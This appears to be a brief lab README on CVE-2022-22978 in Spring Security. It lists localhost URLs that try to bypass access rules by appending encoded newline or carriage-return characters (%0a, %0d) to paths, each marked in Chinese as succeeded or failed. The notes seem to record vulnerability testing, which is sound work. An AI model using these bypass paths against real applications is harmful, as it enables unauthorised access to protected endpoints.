#  CVE-2022-22978
Spring Security 

Pass Spring Security (成功) <br/>
http://localhost:9090/login%0a <br/>

Pass Spring Security with SayMyName (失敗) <br/>
http://localhost:9090/name%0d <br/>

Bypass Spring Security with Custom RBAC (失敗) <br/>
http://localhost:9090/admin/admin%0d <br/>

Bypass Spring Security with Annotation RBAC (失敗) <br/>
http://localhost:9090/user/user%0a <br/>
